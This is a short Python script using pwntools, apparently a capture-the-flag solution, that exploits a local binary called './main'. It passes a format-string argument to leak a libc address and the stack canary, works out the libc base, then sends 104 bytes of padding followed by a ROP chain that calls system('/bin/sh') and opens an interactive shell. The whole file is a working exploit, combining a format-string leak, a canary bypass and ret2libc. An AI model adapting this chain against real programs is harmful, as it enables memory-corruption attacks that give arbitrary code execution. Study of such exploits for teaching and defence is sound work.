#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'

io = process(['./main', '%5$llx:%21$llx'])
libc = ELF("./libc.so.6")

leak = io.recvline().decode().split(":")

canary = int(leak[1], 16)

libc_base = int(leak[0], 16)
libc.address = libc_base - 0x202070

system = libc.symbols['system']
bin_Sh = next(libc.search(b'/bin/sh\x00'))

exit = libc.symbols['exit']

rop = [
        pack(canary),
        pack(0x4242424242424242),
        pack(libc_base + 0xb6f7e),
        pack(libc_base + 0x27f75),
        pack(bin_Sh),
        pack(system),
]

payload = b"A" * 104 + b''.join(rop)
print(repr(payload))

io.sendline(payload)

gdb.attach(io, gdbscript='''
b main
''')

io.interactive()
